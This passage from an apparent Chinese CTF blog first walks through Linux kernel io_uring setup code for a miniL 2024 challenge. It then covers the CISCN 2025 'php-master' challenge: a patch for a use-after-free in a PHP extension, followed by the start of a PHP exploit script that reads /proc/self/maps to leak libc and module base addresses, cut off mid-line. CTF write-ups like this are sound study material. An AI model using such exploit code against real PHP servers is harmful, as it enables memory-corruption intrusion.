<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE2(io_uring_setup, u32, entries,</span><br><span class="line">		<span class="keyword">struct</span> io_uring_params __user *, params)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!io_uring_allowed())</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> io_uring_setup(entries, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>可以看到，setup的2参通过copy_from_user传给了p</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">io_uring_setup</span><span class="params">(u32 entries, <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;p, params, <span class="keyword">sizeof</span>(p)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ARRAY_SIZE(p.resv); i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (p.resv[i])</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (p.flags &amp; ~(IORING_SETUP_IOPOLL | IORING_SETUP_SQPOLL |</span><br><span class="line">			IORING_SETUP_SQ_AFF | IORING_SETUP_CQSIZE |</span><br><span class="line">			IORING_SETUP_CLAMP | IORING_SETUP_ATTACH_WQ |</span><br><span class="line">			IORING_SETUP_R_DISABLED | IORING_SETUP_SUBMIT_ALL |</span><br><span class="line">			IORING_SETUP_COOP_TASKRUN | IORING_SETUP_TASKRUN_FLAG |</span><br><span class="line">			IORING_SETUP_SQE128 | IORING_SETUP_CQE32 |</span><br><span class="line">			IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_DEFER_TASKRUN |</span><br><span class="line">			IORING_SETUP_NO_MMAP | IORING_SETUP_REGISTERED_FD_ONLY |</span><br><span class="line">			IORING_SETUP_NO_SQARRAY))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> io_uring_create(entries, &amp;p, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_uring_create</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">				  <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!entries)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (entries &gt; IORING_MAX_ENTRIES) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_CLAMP))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		entries = IORING_MAX_ENTRIES;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">	    &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Use twice as many entries for the CQ ring. It&#x27;s possible for the</span></span><br><span class="line"><span class="comment">	 * application to drive a higher depth than the size of the SQ ring,</span></span><br><span class="line"><span class="comment">	 * since the sqes are only used at submission time. This allows for</span></span><br><span class="line"><span class="comment">	 * some flexibility in overcommitting a bit. If the application has</span></span><br><span class="line"><span class="comment">	 * set IORING_SETUP_CQSIZE, it will have passed in the desired number</span></span><br><span class="line"><span class="comment">	 * of CQ ring entries manually.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	p-&gt;sq_entries = roundup_pow_of_two(entries);</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQSIZE) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If IORING_SETUP_CQSIZE is set, we do the same roundup</span></span><br><span class="line"><span class="comment">		 * to a power-of-two, if it isn&#x27;t already. We do NOT impose</span></span><br><span class="line"><span class="comment">		 * any cq vs sq ring sizing.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!p-&gt;cq_entries)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;cq_entries &gt; IORING_MAX_CQ_ENTRIES) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_CLAMP))</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			p-&gt;cq_entries = IORING_MAX_CQ_ENTRIES;</span><br><span class="line">		&#125;</span><br><span class="line">		p-&gt;cq_entries = roundup_pow_of_two(p-&gt;cq_entries);</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;cq_entries &lt; p-&gt;sq_entries)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		p-&gt;cq_entries = <span class="number">2</span> * p-&gt;sq_entries;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ctx = io_ring_ctx_alloc(p);</span><br><span class="line">	<span class="keyword">if</span> (!ctx)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN) &amp;&amp;</span><br><span class="line">	    !(ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp;</span><br><span class="line">	    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">		ctx-&gt;task_complete = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;task_complete || (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL))</span><br><span class="line">		ctx-&gt;lockless_cq = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * lazy poll_wq activation relies on -&gt;task_complete for synchronisation</span></span><br><span class="line"><span class="comment">	 * purposes, see io_activate_pollwq()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!ctx-&gt;task_complete)</span><br><span class="line">		ctx-&gt;poll_activated = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When SETUP_IOPOLL and SETUP_SQPOLL are both enabled, user</span></span><br><span class="line"><span class="comment">	 * space applications don&#x27;t need to do io completion events</span></span><br><span class="line"><span class="comment">	 * polling again, they can rely on io_sq_thread to do polling</span></span><br><span class="line"><span class="comment">	 * work, which can reduce cpu usage and uring_lock contention.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL &amp;&amp;</span><br><span class="line">	    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">		ctx-&gt;syscall_iopoll = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	ctx-&gt;compat = in_compat_syscall();</span><br><span class="line">	<span class="keyword">if</span> (!ns_capable_noaudit(&amp;init_user_ns, CAP_IPC_LOCK))</span><br><span class="line">		ctx-&gt;user = get_uid(current_user());</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For SQPOLL, we just need a wakeup, always. For !SQPOLL, if</span></span><br><span class="line"><span class="comment">	 * COOP_TASKRUN is set, then IPIs are never needed by the app.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ret = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line">		<span class="comment">/* IPI related flags don&#x27;t make sense with SQPOLL */</span></span><br><span class="line">		<span class="keyword">if</span> (ctx-&gt;flags &amp; (IORING_SETUP_COOP_TASKRUN |</span><br><span class="line">				  IORING_SETUP_TASKRUN_FLAG |</span><br><span class="line">				  IORING_SETUP_DEFER_TASKRUN))</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_COOP_TASKRUN) &#123;</span><br><span class="line">		ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_TASKRUN_FLAG &amp;&amp;</span><br><span class="line">		    !(ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN))</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		ctx-&gt;notify_method = TWA_SIGNAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For DEFER_TASKRUN we require the completion task to be the same as the</span></span><br><span class="line"><span class="comment">	 * submission task. This implies that there is only one submitter, so enforce</span></span><br><span class="line"><span class="comment">	 * that.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN &amp;&amp;</span><br><span class="line">	    !(ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER)) &#123;</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This is just grabbed for accounting purposes. When a process exits,</span></span><br><span class="line"><span class="comment">	 * the mm is exited and dropped before the files, hence we need to hang</span></span><br><span class="line"><span class="comment">	 * on to this mm purely for the purposes of being able to unaccount</span></span><br><span class="line"><span class="comment">	 * memory (locked/pinned vm). It&#x27;s not used for anything else.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	mmgrab(current-&gt;mm);</span><br><span class="line">	ctx-&gt;mm_account = current-&gt;mm;</span><br><span class="line"></span><br><span class="line">	ret = io_allocate_scq_urings(ctx, p);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">	ret = io_sq_offload_create(ctx, p);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">	ret = io_rsrc_init(ctx);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">	p-&gt;sq_off.head = offsetof(<span class="keyword">struct</span> io_rings, sq.head);</span><br><span class="line">	p-&gt;sq_off.tail = offsetof(<span class="keyword">struct</span> io_rings, sq.tail);</span><br><span class="line">	p-&gt;sq_off.ring_mask = offsetof(<span class="keyword">struct</span> io_rings, sq_ring_mask);</span><br><span class="line">	p-&gt;sq_off.ring_entries = offsetof(<span class="keyword">struct</span> io_rings, sq_ring_entries);</span><br><span class="line">	p-&gt;sq_off.flags = offsetof(<span class="keyword">struct</span> io_rings, sq_flags);</span><br><span class="line">	p-&gt;sq_off.dropped = offsetof(<span class="keyword">struct</span> io_rings, sq_dropped);</span><br><span class="line">	<span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">		p-&gt;sq_off.<span class="built_in">array</span> = (<span class="type">char</span> *)ctx-&gt;sq_array - (<span class="type">char</span> *)ctx-&gt;rings;</span><br><span class="line">	p-&gt;sq_off.resv1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">		p-&gt;sq_off.user_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	p-&gt;cq_off.head = offsetof(<span class="keyword">struct</span> io_rings, cq.head);</span><br><span class="line">	p-&gt;cq_off.tail = offsetof(<span class="keyword">struct</span> io_rings, cq.tail);</span><br><span class="line">	p-&gt;cq_off.ring_mask = offsetof(<span class="keyword">struct</span> io_rings, cq_ring_mask);</span><br><span class="line">	p-&gt;cq_off.ring_entries = offsetof(<span class="keyword">struct</span> io_rings, cq_ring_entries);</span><br><span class="line">	p-&gt;cq_off.overflow = offsetof(<span class="keyword">struct</span> io_rings, cq_overflow);</span><br><span class="line">	p-&gt;cq_off.cqes = offsetof(<span class="keyword">struct</span> io_rings, cqes);</span><br><span class="line">	p-&gt;cq_off.flags = offsetof(<span class="keyword">struct</span> io_rings, cq_flags);</span><br><span class="line">	p-&gt;cq_off.resv1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">		p-&gt;cq_off.user_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	p-&gt;features = IORING_FEAT_SINGLE_MMAP | IORING_FEAT_NODROP |</span><br><span class="line">			IORING_FEAT_SUBMIT_STABLE | IORING_FEAT_RW_CUR_POS |</span><br><span class="line">			IORING_FEAT_CUR_PERSONALITY | IORING_FEAT_FAST_POLL |</span><br><span class="line">			IORING_FEAT_POLL_32BITS | IORING_FEAT_SQPOLL_NONFIXED |</span><br><span class="line">			IORING_FEAT_EXT_ARG | IORING_FEAT_NATIVE_WORKERS |</span><br><span class="line">			IORING_FEAT_RSRC_TAGS | IORING_FEAT_CQE_SKIP |</span><br><span class="line">			IORING_FEAT_LINKED_FILE | IORING_FEAT_REG_REG_RING;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(params, p, <span class="keyword">sizeof</span>(*p))) &#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER</span><br><span class="line">	    &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">		WRITE_ONCE(ctx-&gt;submitter_task, get_task_struct(current));</span><br><span class="line"></span><br><span class="line">	file = io_uring_get_file(ctx);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(file)) &#123;</span><br><span class="line">		ret = PTR_ERR(file);</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __io_uring_add_tctx_node(ctx);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> err_fput;</span><br><span class="line">	tctx = current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Install ring fd as the very last thing, so we don&#x27;t risk someone</span></span><br><span class="line"><span class="comment">	 * having closed it before we finish setup</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">		ret = io_ring_add_registered_file(tctx, file, <span class="number">0</span>, IO_RINGFD_REG_MAX);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ret = io_uring_install_fd(file);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_fput;</span><br><span class="line"></span><br><span class="line">	trace_io_uring_create(ret, ctx, p-&gt;sq_entries, p-&gt;cq_entries, p-&gt;flags);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">err:</span><br><span class="line">	io_ring_ctx_wait_and_kill(ctx);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">err_fput:</span><br><span class="line">	fput(file);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>简单来说就是对传入的队列进行解析参数，也就是说setup中已经完成了队列提交这一个动作</p>
<h4 id="分析完成，伪造结构体"><a href="#分析完成，伪造结构体" class="headerlink" title="分析完成，伪造结构体"></a>分析完成，伪造结构体</h4><p>先把程序生成的结构体dump下来看看</p>
<p>&amp;ring</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/05/10/miniL-2024/-5-10_19-30-39.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/05/10/miniL-2024/-5-10_19-36-44.png"
                     
                ></p>
<p>结构体</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> <span class="title">sq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cq</span> <span class="title">cq</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> flags;</span><br><span class="line">	<span class="type">int</span> ring_fd;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> features;</span><br><span class="line">	<span class="type">int</span> enter_ring_fd;</span><br><span class="line">	__u8 int_flags;</span><br><span class="line">	__u8 pad[<span class="number">3</span>];</span><br><span class="line">	<span class="type">unsigned</span> pad2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>但6.6.1有所不同，setup的2参结构体如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> &#123;</span></span><br><span class="line">	__u32 sq_entries;  <span class="comment">//提交队列数量</span></span><br><span class="line">	__u32 cq_entries;  <span class="comment">//接受队列数量</span></span><br><span class="line">	__u32 flags;</span><br><span class="line">	__u32 sq_thread_cpu;</span><br><span class="line">	__u32 sq_thread_idle;</span><br><span class="line">	__u32 features;</span><br><span class="line">	__u32 wq_fd;</span><br><span class="line">	__u32 resv[<span class="number">3</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_sqring_offsets</span> <span class="title">sq_off</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_cqring_offsets</span> <span class="title">cq_off</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>其中</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sqring_offsets</span> &#123;</span></span><br><span class="line">	__u32 head;</span><br><span class="line">	__u32 tail;</span><br><span class="line">	__u32 ring_mask;</span><br><span class="line">	__u32 ring_entries;</span><br><span class="line">	__u32 flags;</span><br><span class="line">	__u32 dropped;</span><br><span class="line">	__u32 <span class="built_in">array</span>;</span><br><span class="line">	__u32 resv1;</span><br><span class="line">	__u64 user_addr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_cqring_offsets</span> &#123;</span></span><br><span class="line">	__u32 head;</span><br><span class="line">	__u32 tail;</span><br><span class="line">	__u32 ring_mask;</span><br><span class="line">	__u32 ring_entries;</span><br><span class="line">	__u32 overflow;</span><br><span class="line">	__u32 cqes;</span><br><span class="line">	__u32 flags;</span><br><span class="line">	__u32 resv1;</span><br><span class="line">	__u64 user_addr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>三次设置的sqe，结构体见上文</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/05/10/miniL-2024/-5-10_16-07-52.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/05/10/miniL-2024/-5-10_16-08-00.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/05/10/miniL-2024/-5-10_16-08-05.png"
                     
                ></p>
<p>理论上我们就每个结构体都成功伪造并setup就成功了</p>
<h5 id="openat"><a href="#openat" class="headerlink" title="openat"></a>openat</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/05/10/miniL-2024/-5-10_19-32-27.png"
                     
                ></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>miniL</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn-2025-半决赛</title>
    <url>/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="CISCN-2025-半决赛-PWN-AWDP"><a href="#CISCN-2025-半决赛-PWN-AWDP" class="headerlink" title="CISCN 2025 半决赛 PWN AWDP"></a>CISCN 2025 半决赛 PWN AWDP</h1><h1 id="php-master"><a href="#php-master" class="headerlink" title="php-master"></a>php-master</h1><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>导入docker，找到php.ini</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317175335852.png"
                      alt="image-20250317175335852"
                ></p>
<p>很明显是个php-pwn，找到这个vuln.so <code>find / -name &quot;vuln.so&quot;</code></p>
<p>这是一个很简单的UAF，选择将<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317175525895.png"
                      alt="image-20250317175525895"
                ></p>
<p><code>*((_BYTE *)mp + 12) == 1</code> patch为 <code>*((_BYTE *)mp + 12) == 2</code></p>
<p>让他free不了</p>
<h2 id="break（赛后）"><a href="#break（赛后）" class="headerlink" title="break（赛后）"></a>break（赛后）</h2><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2Hex</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) <span class="variable">$hex</span> .= <span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]));</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$hex</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hex</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">int2Str</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$x</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex64</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$value</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$hex64_table</span> = [</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="number">3</span> =&gt; <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="number">4</span> =&gt; <span class="string">&quot;4&quot;</span>,</span><br><span class="line">        <span class="number">5</span> =&gt; <span class="string">&quot;5&quot;</span>,</span><br><span class="line">        <span class="number">6</span> =&gt; <span class="string">&quot;6&quot;</span>,</span><br><span class="line">        <span class="number">7</span> =&gt; <span class="string">&quot;7&quot;</span>,</span><br><span class="line">        <span class="number">8</span> =&gt; <span class="string">&quot;8&quot;</span>,</span><br><span class="line">        <span class="number">9</span> =&gt; <span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="number">10</span> =&gt; <span class="string">&quot;a&quot;</span>,</span><br><span class="line">        <span class="number">11</span> =&gt; <span class="string">&quot;b&quot;</span>,</span><br><span class="line">        <span class="number">12</span> =&gt; <span class="string">&quot;c&quot;</span>,</span><br><span class="line">        <span class="number">13</span> =&gt; <span class="string">&quot;d&quot;</span>,</span><br><span class="line">        <span class="number">14</span> =&gt; <span class="string">&quot;e&quot;</span>,</span><br><span class="line">        <span class="number">15</span> =&gt; <span class="string">&quot;f&quot;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$remainder</span> = <span class="variable">$value</span> % <span class="number">0x10</span>;</span><br><span class="line">        <span class="variable">$value</span> =  (<span class="keyword">int</span>)(<span class="variable">$value</span> / <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$hex64_table</span>[<span class="variable">$remainder</span>] . <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> . <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>, <span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.28.so/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20210902\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="comment">// echo $buffer.&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="comment">// echo $buffer;</span></span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ 